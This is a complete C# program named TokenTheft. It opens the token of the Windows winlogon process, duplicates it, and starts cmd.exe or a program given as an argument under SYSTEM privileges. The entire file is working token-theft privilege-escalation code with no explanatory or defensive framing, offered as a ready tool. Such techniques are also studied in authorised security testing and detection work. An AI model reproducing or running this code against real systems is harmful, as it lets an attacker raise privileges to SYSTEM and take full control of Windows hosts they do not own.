using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Threading;

class TokenTheft {
    [DllImport("advapi32.dll", SetLastError = true)]
    static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);

    [DllImport("advapi32.dll", SetLastError = true)]
    static extern bool DuplicateTokenEx(IntPtr hExistingToken, uint dwDesiredAccess, IntPtr lpTokenAttributes, uint ImpersonationLevel, uint TokenType, out IntPtr phNewToken);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool CloseHandle(IntPtr hObject);

    [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Auto)]
    static extern bool CreateProcessWithTokenW(IntPtr hToken, uint dwLogonFlags, string lpApplicationName, string lpCommandLine, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

    const int TOKEN_QUERY = 0x0008;
    const uint TOKEN_DUPLICATE = 0x0002;
    const uint TOKEN_ALL_ACCESS = 0xF01FF;

    const uint TokenPrimary = 1;
    const uint SecurityImpersonation = 2;

    [StructLayout(LayoutKind.Sequential)]
    public struct PROCESS_INFORMATION {
        public IntPtr hProcess;
        public IntPtr hThread;
        public uint dwProcessId;
        public uint dwThreadId;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct STARTUPINFO {
        public Int32 cb;
        public string lpReserved;
        public string lpDesktop;
        public string lpTitle;
        public Int32 dwX;
        public Int32 dwY;
        public Int32 dwXSize;
        public Int32 dwYSize;
        public Int32 dwXCountChars;
        public Int32 dwYCountChars;
        public Int32 dwFillAttribute;
        public Int32 dwFlags;
        public Int16 wShowWindow;
        public Int16 cbReserved2;
        public IntPtr lpReserved2;
        public IntPtr hStdInput;
        public IntPtr hStdOutput;
        public IntPtr hStdError;
    }

    static void Main(string[] args) {
        string programPath = "cmd.exe";
        string programArguments = "";

        // Check if there are at least two arguments and the first one is "-p"
        if (args.Length >= 2 && args[0] == "-p") {
            programPath = args[1];

            // Check if there are at least four arguments and the third one is "-a"
            if (args.Length >= 4 && args[2] == "-a") {
                // Concatenate the arguments from index 3 onwards
                programArguments = string.Join(" ", args, 3, args.Length - 3);
            }
        }

        // Now you have the program path and arguments, proceed with your logic
        uint processId = FindWinlogonProcessID();
        if (processId == 0) {
            Console.WriteLine("Failed to find the winlogon process.");
            return;
        }

        IntPtr hProcess = Process.GetProcessById((int)processId).Handle;
        IntPtr hToken;

        if (!OpenProcessToken(hProcess, TOKEN_DUPLICATE | TOKEN_QUERY, out hToken)) {
            Console.WriteLine("Failed to open process token. Error code: " + Marshal.GetLastWin32Error());
            return;
        }

        IntPtr hDupToken;
        if (!DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, IntPtr.Zero, SecurityImpersonation, TokenPrimary, out hDupToken)) {
            Console.WriteLine("Failed to duplicate token. Error code: " + Marshal.GetLastWin32Error());
            CloseHandle(hToken);
            return;
        }

        // Prepare process startup information
        STARTUPINFO si = new STARTUPINFO();
        si.cb = Marshal.SizeOf(si);
        PROCESS_INFORMATION pi;

        // Concatenate the program path and arguments
        string commandLine = $"\"{programPath}\" {programArguments}";

        // Print out the constructed command line
        Console.WriteLine("Command line: " + commandLine);

        // Create process with the duplicated token
if (!CreateProcessWithTokenW(hDupToken, 0, null, commandLine, 0, IntPtr.Zero, null, ref si, out pi)) {
    Console.WriteLine("Failed to create process with token. Error code: " + Marshal.GetLastWin32Error());
    CloseHandle(hToken);
    CloseHandle(hDupToken);
    return;
}

// Wait for the process to exit
Process process = Process.GetProcessById((int)pi.dwProcessId);
process.WaitForExit();

// Sleep for 5 seconds to keep the console window open
Thread.Sleep(5000);

Console.WriteLine("Process spawned using token of SYSTEM.");
CloseHandle(hToken);
CloseHandle(hDupToken);
}

    static uint FindWinlogonProcessID() {
        Process[] processes = Process.GetProcessesByName("winlogon");
        foreach (Process p in processes) {
            if (p.SessionId == 1) {
                return (uint)p.Id;
            }
        }
        return 0;
    }
}
